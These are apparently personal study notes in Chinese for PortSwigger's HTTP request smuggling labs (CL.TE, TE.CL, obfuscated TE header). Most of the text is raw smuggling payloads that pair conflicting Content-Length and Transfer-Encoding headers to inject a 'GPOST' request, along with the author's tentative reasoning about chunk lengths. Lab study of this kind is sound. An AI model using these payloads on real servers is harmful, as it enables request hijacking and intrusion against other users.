
**确保协议设置为 HTTP/1，前端服务器为分块时取消自动更新内容长度选项**

### CL.TE 漏洞
实验：HTTP 请求走私，基本的 CL.TE 漏洞 | Web 安全学院
https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

将主页的GET转为POST，并进行分块
POST / HTTP/1.1
Content-Length: 9
Transfer-Encoding: chunked

0

test
响应为
"Unrecognized method TESTPOST"

分块的第二段将与后续内容结合，此处的test与之后的POST方法结合
第二段内容使用 G，即可实现 GPOST

### TE.CL 漏洞

实验：HTTP 请求走私，基本的 TE.CL 漏洞
https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

此处前端为分块，于是body结尾必然是0与两个空行，
此时应当通过包含完整请求来实现GPOST，
且必然使用post结构将0包含在请求体内

```
Content-Length: 4
Transfer-Encoding: chunked

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0


```

前半的分块大小包含全部，内容长度包含分块大小字符与回车换行字符，此处为4
后半的分块大小在请求体中为0，内容长度至少为6则可成功在第二次返回GPOST

疑问，后半长度若为5则包含 0/r/n/r/n 这5个字符，为何要6个及以上？
或许是5个内容长度在后端服务器排队，而一旦之后的请求发出，第六个字符被满足，于是GPOST返回。
否则恰好满足长度为5时，第一个被接收，而第二个被抛弃。
大于5，确保设置的响应对于一个请求而不是被抛弃


### TE.TE 行为：混淆 TE 头部
实验：HTTP 请求走私，混淆 TE 头部
https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header

使用之前两个lab作为基准，尝试对TE头部进行混淆
对CL.TE型成功
```
Content-Length: 6
Transfer-Encoding: x
Transfer-Encoding:	chunked

0

G
```

或TE.CL型
```
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0


```
此处看到，前后服务器对重复头部的解析存在不同，
前服务器使用第一个，后服务器使用第二个








